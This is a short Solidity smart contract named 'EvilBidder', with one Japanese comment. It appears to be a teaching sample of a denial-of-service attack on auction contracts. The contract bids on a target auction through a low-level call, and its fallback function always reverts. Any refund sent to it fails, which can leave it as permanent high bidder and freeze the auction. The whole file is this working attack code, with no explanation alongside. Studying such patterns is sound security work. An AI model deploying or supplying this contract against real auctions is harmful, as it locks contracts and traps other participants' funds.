pragma solidity ^0.4.18;

contract EvilBidder {
    // FallBack関数
    function() public payable {
        revert();
    }

    function bid(address _to) public payable {
        if(!_to.call.value(msg.value)(bytes4(keccak256("bid()")))){
            revert();
        }
    }
}